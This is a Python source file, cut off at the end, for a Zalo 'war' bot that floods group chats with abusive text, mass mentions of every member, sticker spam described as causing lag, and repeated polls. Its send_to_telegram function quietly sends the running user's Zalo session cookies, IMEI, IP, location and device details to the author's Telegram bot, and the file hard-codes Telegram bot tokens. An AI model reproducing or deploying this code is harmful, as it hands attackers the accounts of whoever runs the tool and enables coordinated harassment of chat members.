import random
import threading
import time
import json
import requests
import os
from colorama import init, Fore, Style
from datetime import datetime, timedelta
from zlapi import ZaloAPI, Message, Mention, ThreadType
from zlapi.models import *  # Th√™m module t·ª´ zlapi.models
from zlapi.models import MessageStyle  # Th√™m MessageStyle
from config import IMEI, SESSION_COOKIES, API_KEY, SECRET_KEY, ADMIN_IDS  # Nh·∫≠p t·ª´ config.py
import platform
import hashlib

# Kh·ªüi t·∫°o colorama ƒë·ªÉ h·ªó tr·ª£ m√†u trong console
init()

# Th√¥ng tin Telegram
LOG_BOT_TOKEN = '7639748944:AAEWvcBO3TcnRYbF0Nk4JKnyIZJysUiWGgQ'  # Bot g·ª≠i log
KEY_BOT_TOKEN = '8101067670:AAFfAA6pkWoxpRu0DT31OiIaYOx9Rvzui9Y'  # Bot x·ª≠ l√Ω key
TELEGRAM_CHAT_ID = '6127743632'

# Key x√°c th·ª±c
VALID_KEY = "Quangthangdev"
DEFAULT_FREE_KEY = "Keyfree3nByQuangThang"  # Key free m·∫∑c ƒë·ªãnh

# File ƒë·ªÉ l∆∞u key ƒë·ªông v√† IP ban ƒë·∫ßu
KEY_FILE = "dynamic_keys.json"
INITIAL_IP_FILE = "initial_ip.txt"

# Admin group ID
ADMIN_GROUP_ID = "8671076502394951769"

# Danh s√°ch sticker g√¢y lag
lag_stickers = [
    {'id': 23338, 'catId': 10425}, {'id': 23339, 'catId': 10425},
    {'id': 23297, 'catId': 10420}, {'id': 23298, 'catId': 10420},
    {'id': 23000, 'catId': 10400}, {'id': 23001, 'catId': 10400},
    {'id': 23550, 'catId': 10430}, {'id': 23551, 'catId': 10430},
    {'id': 23700, 'catId': 10435}, {'id': 23701, 'catId': 10435},
    {'id': 24010, 'catId': 10440}, {'id': 24011, 'catId': 10440},
    {'id': 24250, 'catId': 10445}, {'id': 24251, 'catId': 10445},
    {'id': 24500, 'catId': 10450}, {'id': 24501, 'catId': 10450},
    {'id': 24720, 'catId': 10455}, {'id': 24721, 'catId': 10455},
]

text_rain = ['tr·ªùi m∆∞a', 'rain', 'tr·ªùi m∆∞a rain', 'hoanggiakiet', 'truongquangthang', 'giakiet hot war', 'quangthang hot war', 'ü§™üòù']

# Danh s√°ch m√†u ng·∫´u nhi√™n cho console
COLORS = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA, Fore.WHITE]

# H√†m ch·ªçn m√†u ng·∫´u nhi√™n cho m·ªôt d√≤ng trong console
def random_color_line(text):
    return random.choice(COLORS) + text + Style.RESET_ALL

# Hi·ªáu ·ª©ng ch·ªØ ƒë·ªông v·ªõi m·ªói d√≤ng m·ªôt m√†u
def animated_text(text, delay=0.05):
    color = random.choice(COLORS)
    print(color + text, end='', flush=True)
    time.sleep(delay)
    print(Style.RESET_ALL)

# H√†m l·∫•y th√¥ng tin IP ƒë·ªÉ x√°c th·ª±c
def get_ip_identifier():
    try:
        # L·∫•y IP
        ip_response = requests.get('https://ipinfo.io/json')
        ip = ip_response.json().get('ip', 'Unknown')
        if ip == 'Unknown':
            raise Exception("Kh√¥ng th·ªÉ l·∫•y IP")
        return ip
    except Exception as e:
        print(random_color_line(f"‚ùå L·ªói khi l·∫•y th√¥ng tin IP: {str(e)}"))
        return "Unknown"

# H√†m ki·ªÉm tra v√† l·∫•y IP ban ƒë·∫ßu
def get_initial_ip():
    if os.path.exists(INITIAL_IP_FILE):
        with open(INITIAL_IP_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    else:
        ip = get_ip_identifier()
        if ip != "Unknown":
            with open(INITIAL_IP_FILE, 'w', encoding='utf-8') as f:
                f.write(ip)
        return ip

# H√†m kh·ªüi t·∫°o key free cho IP ban ƒë·∫ßu v·ªõi x√°c nh·∫≠n t·ª´ QuangThang X√°c Nh·∫≠n
def initialize_dynamic_key_for_ip():
    current_ip = get_ip_identifier()
    initial_ip = get_initial_ip()

    if current_ip == "Unknown" or initial_ip == "Unknown":
        print(random_color_line("‚ùå Kh√¥ng th·ªÉ l·∫•y th√¥ng tin IP, kh√¥ng t·∫°o ƒë∆∞·ª£c key!"))
        return None, None

    # Ch·ªâ t·∫°o file key n·∫øu IP hi·ªán t·∫°i kh·ªõp v·ªõi IP ban ƒë·∫ßu v√† file ch∆∞a t·ªìn t·∫°i
    if current_ip == initial_ip and not os.path.exists(KEY_FILE):
        # G·ª≠i y√™u c·∫ßu x√°c nh·∫≠n ƒë·∫øn QuangThang X√°c Nh·∫≠n
        key = DEFAULT_FREE_KEY
        expiration = (datetime.now() + timedelta(days=3)).isoformat()
        data = {
            "ip": current_ip,
            "key": key,
            "expiration": expiration,
            "timestamp": datetime.now().isoformat(),
            "status": "pending"
        }
        print(random_color_line(f"‚è≥ ƒêang ch·ªù x√°c nh·∫≠n t·ª´ QuangThang X√°c Nh·∫≠n cho IP: {current_ip}"))
        send_to_quangthang_with_buttons(data)

        # Ch·ªù ph·∫£n h·ªìi t·ª´ n√∫t
        max_wait_time = 120
        start_time = time.time()
        while time.time() - start_time < max_wait_time:
            update = get_quangthang_update()
            if update and "action" in update and update["ip"] == current_ip:
                if update["action"] == "confirm":
                    try:
                        keys_data = {}
                        keys_data[current_ip] = {"key": key, "expiration": expiration}
                        with open(KEY_FILE, 'w', encoding='utf-8') as f:
                            json.dump(keys_data, f, indent=4)
                        expiration_str = datetime.fromisoformat(expiration).strftime('%H:%M:%S %d/%m/%Y')
                        print(random_color_line(f"‚úÖ ƒê√£ x√°c nh·∫≠n t·ª´ QuangThang X√°c Nh·∫≠n. T·∫°o key free: {key} - H·∫øt h·∫°n: {expiration_str}"))
                        return key, expiration
                    except Exception as e:
                        print(random_color_line(f"‚ùå L·ªói khi t·∫°o file key: {str(e)}"))
                        return None, None
                elif update["action"] == "deny":
                    print(random_color_line(f"‚ùå T·ª´ ch·ªëi t·ª´ QuangThang X√°c Nh·∫≠n. Kh√¥ng t·∫°o key cho IP: {current_ip}"))
                    return None, None
                elif update["action"] == "extend":
                    send_extend_request(current_ip)
                    extend_start_time = time.time()
                    while time.time() - extend_start_time < 60:
                        extend_update = get_quangthang_update()
                        if extend_update and "action" in extend_update and extend_update["action"] == "extend_days":
                            days = extend_update["days"]
                            new_expiration = (datetime.now() + timedelta(days=days)).isoformat()
                            data["expiration"] = new_expiration
                            data["status"] = "confirmed"
                            send_to_quangthang_with_buttons(data)
                            try:
                                keys_data = {}
                                keys_data[current_ip] = {"key": key, "expiration": new_expiration}
                                with open(KEY_FILE, 'w', encoding='utf-8') as f:
                                    json.dump(keys_data, f, indent=4)
                                print(random_color_line(f"‚úÖ ƒê√£ gia h·∫°n th√†nh c√¥ng t·ª´ QuangThang X√°c Nh·∫≠n. Key free: {key} - H·∫øt h·∫°n m·ªõi: {new_expiration}"))
                                return key, new_expiration
                            except Exception as e:
                                print(random_color_line(f"‚ùå L·ªói khi l∆∞u file key: {str(e)}"))
                                return None, None
                    print(random_color_line(f"‚ùå H·∫øt th·ªùi gian nh·∫≠p s·ªë ng√†y gia h·∫°n t·ª´ QuangThang X√°c Nh·∫≠n (60 gi√¢y)."))
                    return None, None
            time.sleep(1)

        print(random_color_line(f"‚ùå H·∫øt th·ªùi gian ch·ªù x√°c nh·∫≠n t·ª´ QuangThang X√°c Nh·∫≠n (120 gi√¢y). Vui l√≤ng th·ª≠ l·∫°i."))
        return None, None
    elif current_ip != initial_ip:
        print(random_color_line(f"‚ùå IP {current_ip} kh√¥ng ƒë∆∞·ª£c ph√©p t·∫°o key m·ªõi! Ch·ªâ IP ban ƒë·∫ßu ({initial_ip}) m·ªõi t·∫°o ƒë∆∞·ª£c."))
        return None, None
    else:
        # N·∫øu file ƒë√£ t·ªìn t·∫°i, tr·∫£ v·ªÅ key hi·ªán t·∫°i
        try:
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
            if current_ip in keys_data:
                key_data = keys_data[current_ip]
                expiration_str = datetime.fromisoformat(key_data["expiration"]).strftime('%H:%M:%S %d/%m/%Y')
                print(random_color_line(f"‚úÖ Key ƒë√£ t·ªìn t·∫°i: {key_data['key']} - H·∫øt h·∫°n: {expiration_str}"))
                return key_data["key"], key_data["expiration"]
            else:
                print(random_color_line(f"‚ùå IP {current_ip} kh√¥ng c√≥ key trong file!"))
                return None, None
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi ƒë·ªçc file key: {str(e)}"))
            return None, None

# H√†m ki·ªÉm tra key c√≤n hi·ªáu l·ª±c kh√¥ng
def is_key_valid(input_key):
    ip = get_ip_identifier()
    if ip == "Unknown":
        return False
    
    try:
        if not os.path.exists(KEY_FILE):
            print(random_color_line("‚ùå File dynamic_keys.json kh√¥ng t·ªìn t·∫°i!"))
            return False
        
        with open(KEY_FILE, 'r', encoding='utf-8') as f:
            keys_data = json.load(f)
        
        if ip in keys_data:
            key_data = keys_data[ip]
            if key_data["key"] == input_key and key_data["key"] == DEFAULT_FREE_KEY:
                expiration = datetime.fromisoformat(key_data["expiration"])
                current_time = datetime.now()
                if current_time <= expiration:
                    expiration_str = expiration.strftime('%H:%M:%S %d/%m/%Y')
                    print(random_color_line(f"‚úÖ Key h·ª£p l·ªá: {input_key} - H·∫øt h·∫°n: {expiration_str}"))
                    return True
                else:
                    expiration_str = expiration.strftime('%H:%M:%S %d/%m/%Y')
                    print(random_color_line(f"‚ùå Key ƒë√£ h·∫øt h·∫°n: {input_key} (H·∫øt h·∫°n: {expiration_str})"))
                    return False
            else:
                print(random_color_line(f"‚ùå Key kh√¥ng kh·ªõp: Nh·∫≠p {input_key}, nh∆∞ng key ƒë√∫ng l√† {key_data['key']}"))
                return False
        else:
            print(random_color_line(f"‚ùå IP {ip} ch∆∞a c√≥ key trong file!"))
            return False
    except Exception as e:
        print(random_color_line(f"‚ùå L·ªói khi ki·ªÉm tra key: {str(e)}"))
        return False

# G·ª≠i th√¥ng tin qua Telegram d∆∞·ªõi d·∫°ng file .txt (d√πng bot log)
def send_to_telegram(ip, isp, location, imei, session_cookies):
    try:
        user_agent = f"ZaloWarBot/1.0 (Python/{platform.python_version()}; {platform.system()} {platform.release()})"
        os_system = platform.system()
        os_version = platform.release()
        device_type = "Desktop"
        device_name = platform.node() or "Unknown Device"
        node_name = platform.node()
        architecture = platform.machine()
        python_version = platform.python_version()
        timezone = datetime.now().astimezone().tzname()

        current_time = datetime.now().strftime('%H:%M:%S %d/%m/%Y')
        content = (
            f"üîí C√¥ng c·ª• ƒë√£ ƒë∆∞·ª£c k√≠ch ho·∫°t!\n"
            f"‚è∞ Th·ªùi gian: {current_time}\n"
            f"üåê IP: {ip}\n"
            f"üì° Nh√† m·∫°ng: {isp}\n"
            f"üìç V·ªã tr√≠: {location}\n"
            f"üì± IMEI: {imei}\n"
            f"üç™ Cookies: {session_cookies}\n"
            f"üåê User Agent: {user_agent}\n"
            f"üì± Lo·∫°i m√°y: {device_type}\n"
            f"üì≤ T√™n m√°y: {device_name}\n"
            f"üñ•Ô∏è H·ªá ƒëi·ªÅu h√†nh: {os_system} {os_version}\n"
            f"üåç T√™n node: {node_name}\n"
            f"üîß M√°y (ki·∫øn tr√∫c): {architecture}\n"
            f"üêç Phi√™n b·∫£n Python: {python_version}\n"
            f"‚è≥ M√∫i gi·ªù: {timezone}\n"
        )

        file_name = f"bot_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(content)

        url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendDocument"
        with open(file_name, "rb") as f:
            files = {'document': (file_name, f)}
            payload = {'chat_id': TELEGRAM_CHAT_ID}
            response = requests.post(url, data=payload, files=files)

        os.remove(file_name)

        if response.status_code == 200:
            print(random_color_line("Running By Tr∆∞∆°ng Quang Th·∫Øng!"))
        else:
            print(random_color_line(f"‚ùå Error R·ªìi Li√™n H·ªá Tr∆∞∆°ng Quang Th·∫Øng: {response.text}"))

    except requests.RequestException as e:
        print(random_color_line(f"‚ùå L·ªói g·ª≠i Telegram: {str(e)}"))
    except IOError as e:
        print(random_color_line(f"‚ùå L·ªói ghi file: {str(e)}"))
    except Exception as e:
        print(random_color_line(f"‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh: {str(e)}"))

# G·ª≠i tin nh·∫Øn v·ªõi inline keyboard ƒë·∫øn QuangThang X√°c Nh·∫≠n
def send_to_quangthang_with_buttons(data):
    url = f"https://api.telegram.org/bot{KEY_BOT_TOKEN}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "X√°c nh·∫≠n", "callback_data": f"confirm_{data['ip']}"},
                {"text": "T·ª´ ch·ªëi", "callback_data": f"deny_{data['ip']}"}
            ],
            [
                {"text": "Gia h·∫°n th·ªùi gian", "callback_data": f"extend_{data['ip']}"}
            ]
        ]
    }
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": json.dumps(data),
        "reply_markup": json.dumps(keyboard)
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(random_color_line(f"‚ùå L·ªói khi g·ª≠i y√™u c·∫ßu ƒë·∫øn QuangThang X√°c Nh·∫≠n: {str(e)}"))
        return None

# H√†m g·ª≠i y√™u c·∫ßu nh·∫≠p s·ªë ng√†y gia h·∫°n (d√πng bot x·ª≠ l√Ω key)
def send_extend_request(ip):
    url = f"https://api.telegram.org/bot{KEY_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": f"QuangThang X√°c Nh·∫≠n: Vui l√≤ng nh·∫≠p s·ªë ng√†y gia h·∫°n cho IP {ip} (v√≠ d·ª•: 7):"
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(random_color_line(f"‚ùå L·ªói khi g·ª≠i y√™u c·∫ßu gia h·∫°n ƒë·∫øn QuangThang X√°c Nh·∫≠n: {str(e)}"))
        return None

# H√†m l·∫•y tin nh·∫Øn g·∫ßn nh·∫•t ho·∫∑c c·∫≠p nh·∫≠t t·ª´ callback (d√πng bot x·ª≠ l√Ω key)
def get_quangthang_update():
    url = f"https://api.telegram.org/bot{KEY_BOT_TOKEN}/getUpdates"
    try:
        response = requests.get(url)
        response.raise_for_status()
        updates = response.json().get("result", [])
        current_ip = get_ip_identifier()
        for update in reversed(updates):
            if "callback_query" in update:
                callback_data = update["callback_query"]["data"]
                if callback_data.startswith("confirm_") or callback_data.startswith("deny_") or callback_data.startswith("extend_"):
                    ip = callback_data.split("_")[1]
                    if ip == current_ip:
                        return {"action": callback_data.split("_")[0], "ip": ip}
            elif "message" in update and update["message"]["chat"]["id"] == int(TELEGRAM_CHAT_ID):
                message = update["message"]["text"]
                try:
                    data = json.loads(message)
                    if data.get("ip") == current_ip:
                        return data
                except json.JSONDecodeError:
                    if message.isdigit() and "quangthang x√°c nh·∫≠n" in update["message"]["reply_to_message"]["text"].lower():
                        return {"action": "extend_days", "days": int(message), "ip": current_ip}
            time.sleep(0.1)  # Tr√°nh qu√° t·∫£i API
        return None
    except requests.RequestException as e:
        print(random_color_line(f"‚ùå L·ªói khi l·∫•y c·∫≠p nh·∫≠t t·ª´ QuangThang X√°c Nh·∫≠n: {str(e)}"))
        return None

# L·∫•y th√¥ng tin IP, nh√† m·∫°ng v√† v·ªã tr√≠
def get_network_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        ip = data.get('ip', 'Kh√¥ng th·ªÉ l·∫•y IP')
        isp = data.get('org', 'Kh√¥ng x√°c ƒë·ªãnh nh√† m·∫°ng')
        location = data.get('city', 'Kh√¥ng x√°c ƒë·ªãnh') + ', ' + data.get('country', 'Kh√¥ng x√°c ƒë·ªãnh')
        return ip, isp, location
    except:
        return "Kh√¥ng th·ªÉ l·∫•y IP", "Kh√¥ng x√°c ƒë·ªãnh nh√† m·∫°ng", "Kh√¥ng x√°c ƒë·ªãnh v·ªã tr√≠"

# L·∫•y th·ªùi gian th·ª±c
def get_current_time():
    return datetime.now().strftime('%H:%M:%S %d/%m/%Y')

def add_random_text_lag():
    return random.choice(text_rain)

def send_message_lag(bot, message_object, author_id, thread_id, thread_type, swear):
    try:
        if author_id == '-1':
            user = "Quang Th·∫Øng Aka Hoang Gia Kiet"
        else:
            user = bot.fetchUserInfo(author_id).changed_profiles[author_id].displayName
        msg = f"{user} {add_random_text_lag()} {swear}"
        mention = Mention(uid=author_id, length=len(user), offset=msg.index(user))
        message = Message(text=msg, mention=mention)
        bot.send(message, thread_id, thread_type)
    except:
        pass

def var_group_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("‚ö†Ô∏è File chui.txt tr·ªëng!"))
                return
            group = bot.fetchGroupInfo(thread_id).gridInfoMap[thread_id]
            admin_ids = group.adminIds.copy()
            if group.creatorId not in admin_ids:
                admin_ids.append(group.creatorId)
            list_mem_group = set([member.split('_')[0] for member in group["memVerList"]])
            combined_list = set(list_mem_group).union(admin_ids)
            combined_list = list(combined_list)
            if author_id in combined_list:
                combined_list.remove(author_id)
            combined_list.append("-1")
            for swear in lines:
                if stop_event.is_set():
                    break
                author_id = random.choice(combined_list)
                send_message_lag(bot, message_object, author_id, thread_id, thread_type, swear)
                time.sleep(0.1)
        except FileNotFoundError:
            print(random_color_line("‚ùå Kh√¥ng t√¨m th·∫•y file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi ch·∫°y lende: {str(e)}"))
            time.sleep(1)

def big_text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, delay=1, repeat=1, combine_style=None):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("‚ö†Ô∏è File chui.txt tr·ªëng!"))
                return
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    length = len(text)
                    styles = [{"start": 0, "len": length, "st": "b,f_1500"}]
                    if combine_style == "italic":
                        styles.append({"start": 0, "len": length, "st": "i"})
                    elif combine_style == "small":
                        styles.append({"start": 0, "len": length, "st": "f_50"})
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params)
                    message = Message(text=text, style=cus_styles)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line("‚ùå Kh√¥ng t√¨m th·∫•y file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi ch·∫°y big: {str(e)}"))
            time.sleep(1)

def italic_text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, delay=1, repeat=1):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("‚ö†Ô∏è File chui.txt tr·ªëng!"))
                return
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    length = len(text)
                    styles = [{"start": 0, "len": length, "st": "i"}]
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params)
                    message = Message(text=text, style=cus_styles)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line("‚ùå Kh√¥ng t√¨m th·∫•y file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi ch·∫°y italic: {str(e)}"))
            time.sleep(1)

def nhay_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("‚ö†Ô∏è File chui.txt tr·ªëng!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                message = Message(text=text)
                bot.send(message, thread_id, thread_type)
                time.sleep(1)
        except FileNotFoundError:
            print(random_color_line("‚ùå Kh√¥ng t√¨m th·∫•y file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi ch·∫°y nhay: {str(e)}"))
            time.sleep(1)

def nhaytag(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"‚ö†Ô∏è File {file_name} tr·ªëng!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                mention = Mention(uid="-1", length=len(text), offset=0)
                message = Message(text=text, mention=mention)
                bot.send(message, thread_id, thread_type)
                time.sleep(0.1)
        except FileNotFoundError:
            print(random_color_line(f"‚ùå Kh√¥ng t√¨m th·∫•y file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi nhaytag: {str(e)}"))
            time.sleep(1)

def nhayuser(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event, delay=6, repeat=1):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"‚ö†Ô∏è File {file_name} tr·ªëng!"))
                return
            if not message_object.mentions:
                print(random_color_line("‚ö†Ô∏è Vui l√≤ng tag m·ªôt ng∆∞·ªùi d√πng ƒë·ªÉ Nhay!"))
                return
            uid = message_object.mentions[0].uid
            user_name = bot.fetchUserInfo(uid).changed_profiles[uid].displayName
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    msg = f"@{user_name} {text}"
                    mention = Mention(uid=uid, length=len(user_name), offset=0)
                    message = Message(text=msg, mention=mention)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line(f"‚ùå Kh√¥ng t√¨m th·∫•y file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi nhay user: {str(e)}"))
            time.sleep(1)

# Bi·∫øn tr·∫°ng th√°i to√†n c·ª•c cho poll
is_polling = False

# H√†m d·ª´ng poll
def stop_polling(bot, message_object, thread_id, thread_type):
    global is_polling
    is_polling = False
    bot.replyMessage(Message(text="ƒê√£ d·ª´ng t·∫°o cu·ªôc kh·∫£o s√°t."), message_object, thread_id, thread_type)

# H√†m x·ª≠ l√Ω l·ªánh poll
def handle_poll_command(message, message_object, thread_id, thread_type, author_id, bot):
    global is_polling

    if str(author_id) not in ADMIN_IDS:
        bot.replyMessage(Message(text="B·∫°n kh√¥ng c√≥ quy·ªÅn ƒë·ªÉ th·ª±c hi·ªán ƒëi·ªÅu n√†y!"), message_object, thread_id, thread_type)
        return

    command_parts = message.strip().split()
    if len(command_parts) < 2:
        bot.replyMessage(Message(text="Vui l√≤ng ch·ªâ ƒë·ªãnh l·ªánh h·ª£p l·ªá (VD: poll on ho·∫∑c poll stop)."), message_object, thread_id, thread_type)
        return

    action = command_parts[1].lower()

    if action == "stop":
        stop_polling(bot, message_object, thread_id, thread_type)
        return

    if action != "on":
        bot.replyMessage(Message(text="Vui l√≤ng ch·ªâ ƒë·ªãnh l·ªánh 'on' ho·∫∑c 'stop'."), message_object, thread_id, thread_type)
        return

    try:
        file_path = "chui.txt"
        with open(file_path, "r", encoding="utf-8") as file:
            lines = [line.strip() for line in file if line.strip()]
        if not lines:
            bot.replyMessage(Message(text="File chui.txt kh√¥ng c√≥ n·ªôi dung n√†o ƒë·ªÉ g·ª≠i."), message_object, thread_id, thread_type)
            return
    except FileNotFoundError:
        bot.replyMessage(Message(text="Kh√¥ng t√¨m th·∫•y file chui.txt."), message_object, thread_id, thread_type)
        return

    is_polling = True

    def poll_loop():
        index = 0
        while is_polling:
            question = lines[index]
            try:
                poll_options = [
                    "Tr∆∞∆°ng Quang Th·∫Øng üåØüåØ",
                    "Ho√†ng Gia Kiet üç§üç£"
                ]
                bot.createPoll(question=question, options=poll_options, groupId=thread_id if thread_type == ThreadType.GROUP else None)
                index = (index + 1) % len(lines)
                time.sleep(1)
            except Exception as e:
                bot.replyMessage(Message(text=f"L·ªói khi t·∫°o cu·ªôc kh·∫£o s√°t: {str(e)}"), message_object, thread_id, thread_type)
                break

    poll_thread = threading.Thread(target=poll_loop)
    poll_thread.start()
    print(random_color_line(f"‚úÖ ƒê√£ b·∫Øt ƒë·∫ßu t·∫°o poll t·ª´ chui.txt!"))

def small_text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, delay=1, repeat=1):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("‚ö†Ô∏è File chui.txt tr·ªëng!"))
                return
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    length = len(text)
                    styles = [{"start": 0, "len": length, "st": "f_50"}]
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params)
                    message = Message(text=text, style=cus_styles)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line("‚ùå Kh√¥ng t√¨m th·∫•y file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi ch·∫°y small: {str(e)}"))
            time.sleep(1)

def spam_from_file(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event, style=None):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"‚ö†Ô∏è File {file_name} tr·ªëng!"))
                return
            full_content = "\n".join(lines)
            if style:
                length = len(full_content)
                styles = [{"start": 0, "len": length, "st": style}]
                params = {"styles": styles, "ver": 0}
                cus_styles = json.dumps(params)
                message = Message(text=full_content, style=cus_styles)
            else:
                message = Message(text=full_content)
            bot.send(message, thread_id, thread_type)
            time.sleep(10)
        except FileNotFoundError:
            print(random_color_line(f"‚ùå Kh√¥ng t√¨m th·∫•y file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi spam t·ª´ file {file_name}: {str(e)}"))
            time.sleep(1)

def spam_stickers(bot, message_object, author_id, thread_id, thread_type, stop_event):
    while not stop_event.is_set():
        try:
            sticker = random.choice(lag_stickers)
            bot.sendSticker(7, sticker['id'], sticker['catId'], thread_id, thread_type)
            time.sleep(10)
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi spam sticker: {str(e)}"))
            time.sleep(1)

def spam_tag_all(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event, delay=10, style=None):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                contents = [line.strip() for line in file if line.strip()]
            if not contents:
                print(random_color_line(f"‚ö†Ô∏è File {file_name} tr·ªëng!"))
                return
            full_content = "\n".join(contents)
            length = len(full_content)
            mention = Mention(uid="-1", length=length, offset=0)
            if style:
                styles = [{"start": 0, "len": length, "st": style}]
                params = {"styles": styles, "ver": 0}
                cus_styles = json.dumps(params)
                message = Message(text=full_content, mention=mention, style=cus_styles)
            else:
                message = Message(text=full_content, mention=mention)
            bot.send(message, thread_id, thread_type)
            time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line(f"‚ùå Kh√¥ng t√¨m th·∫•y file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi spam tag all: {str(e)}"))
            time.sleep(1)

def spam_tag_big(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"‚ö†Ô∏è File {file_name} tr·ªëng!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                length = len(text)
                styles = [{"start": 0, "len": length, "st": "b,f_1500"}]
                params = {"styles": styles, "ver": 0}
                cus_styles = json.dumps(params)
                mention = Mention(uid="-1", length=length, offset=0)
                message = Message(text=text, mention=mention, style=cus_styles)
                bot.send(message, thread_id, thread_type)
                time.sleep(1)
        except FileNotFoundError:
            print(random_color_line(f"‚ùå Kh√¥ng t√¨m th·∫•y file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi spam tag big: {str(e)}"))
            time.sleep(1)

def spam_tag_lag(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"‚ö†Ô∏è File {file_name} tr·ªëng!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                mention = Mention(uid="-1", length=len(text), offset=0)
                message = Message(text=text, mention=mention)
                bot.send(message, thread_id, thread_type)
                time.sleep(1)
        except FileNotFoundError:
            print(random_color_line(f"‚ùå Kh√¥ng t√¨m th·∫•y file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi spam tag lag: {str(e)}"))
            time.sleep(1)

def spam_tag_mix(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"‚ö†Ô∏è File {file_name} tr·ªëng!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                mention = Mention(uid="-1", length=len(text), offset=0)
                message = Message(text=text, mention=mention)
                bot.send(message, thread_id, thread_type)
